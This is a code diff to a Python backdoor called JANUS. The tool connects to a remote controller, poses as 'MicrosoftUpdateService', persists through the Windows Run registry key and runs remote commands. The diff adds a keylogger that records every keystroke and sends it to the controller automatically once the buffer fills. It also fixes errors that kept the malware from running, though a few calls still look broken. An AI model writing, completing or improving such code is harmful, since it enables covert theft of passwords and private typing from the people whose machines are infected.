@@ -5,6 +5,8 @@ import shutil
 import socket
 import subprocess
 from time import sleep
+from pynput import Keyboard
+from datetime import datetime
 
 # Resolve path regardless of if running directly or as PyInstaller executable
 if getattr(sys, 'frozen', False):
@@ -26,7 +28,74 @@ IP = os.environ.get("JANUS_IP", "127.0.0.1")
 PORT = int(os.environ.get("JANUS_PORT", 443))
 PROGRAM_NAME = os.environ.get("PROGRAM_NAME", "MicrosoftUpdateService")
 REGISTRY_KEY_PATH = os.environ.get("REGISTRY_KEY_PATH", "Software\Microsoft\Windows\CurrentVersion\Run")
+MAX_BUFFER_SIZE = 500
 
+keylog_buffer = []
+buffer_auto_send_pending = False
+keylogger_active = False
+listener = None
+
+
+def format_key(key):
+    try:
+        return key.char
+    except AttributeError:
+        special_keys = {
+            Keyboard.Key.space: ' ',
+            Keyboard.Key.enter: '[ENTER]\n',
+            Keyboard.Key.tab: '[TAB]',
+            Keyboard.Key.backspace: '[BACKSPACE]',
+            Keyboard.Key.shift: '',
+            Keyboard.Key.ctrl: '',
+            Keyboard.Key.alt: '',
+        }
+        return special_keys.get(key, f'[{key.name.upper()}]')
+
+def on_press(key):
+    global keylog_buffer, buffer_auto_send_pending
+
+    formatted = format_key(key)
+    if formatted:
+        keylog_buffer.append(formatted)
+    
+    if len(keylog_buffer) >= MAX_BUFFER_SIZE:
+        buffer_auto_send_pending = True
+
+def get_keylog_data():
+    global keylog_buffer
+
+    if not keylog_buffer:
+        return "[i] keylog buffer is empty"
+
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    data = f'[+] keylog captured at {timestamp}:\n{"".join(keylog_buffer)}'
+    keylog_buffer = []
+
+    return data
+
+def start_keylogger():
+    global keylogger_active, listener
+
+    if keylogger_active:
+        return "[i] keylogger already runnig"
+    
+    listener = Keyboard.Listener(on_press=on_press)
+    listener.start()
+    keylogger_active = True
+
+    return "[+] keylogger started"
+
+def stop_keylogger():
+    global keylogger_active, listener
+
+    if not keylogger_active:
+        return "[i] keylogger not running"
+
+    if listener:
+        listener.stop()
+    
+    keylogger_active = False
+    return "[+] keylogger stopped"
 
 def copy_to_system():
     try:
@@ -53,7 +122,7 @@ def add_to_registry(file_path):
             winreg.HKEY_CURRENT_USER,
             REGISTRY_KEY_PATH,
             0,
-            winreg..KEY_SET_VALUE
+            winreg.KEY_SET_VALUE
         )
 
         winreg.SetValueEx(
@@ -83,12 +152,12 @@ def check_persistence():
 
         return True
 
-    except FileNptFoundError:
+    except FileNotFoundError:
         return False
 
     except Exception as e:
         print(f'[-] Error checking persistence: {e}')
-        return F'alse
+        return False
 
 # inicializa as configurações de persistência
 def setup_persistence():
@@ -102,7 +171,7 @@ def setup_persistence():
 
 
     except Exception as e:
-        print("ERROR")
+        print(f"ERROR: {e}")
 
 
 def connect():
@@ -115,14 +184,28 @@ def connect():
         print(f'Connection error: {e}')
 
 
-def listen(c):  
+def listen(c):
+    global buffer_auto_send_pending
+
     try:
         while True:
-            data = c.recv(1024).decode().strip()
-            if data == "/exit":
-                return
-            else:
-                cmd(c, data)
+
+            if buffer_auto_send_pending:
+                data = get_keylog_data()
+                c.send(f'[AUTO-SEND] {data}\n\n'.encode())
+                buffer_auto_send_pending = False
+            
+            c.setTimeout(0.5)
+            
+            try:
+                data = c.recv(1024).decode().strip()
+                if data == "/exit":
+                    return
+                else:
+                    cmd(c, data)
+            
+            except socket.timeout:
+                continue
 
     except Exception as e:
         print(f'Listen function error: {e}')
@@ -136,7 +219,7 @@ def cmd(c, data):
                 os.chdir(data[3:].strip())
             except Exception as e:
                 print(f'CD function error: {e}')            
-            c.send("[i] Directory changed")
+            c.send(b"[i] Directory changed")
             return
 
         if data == "/check_persistence":
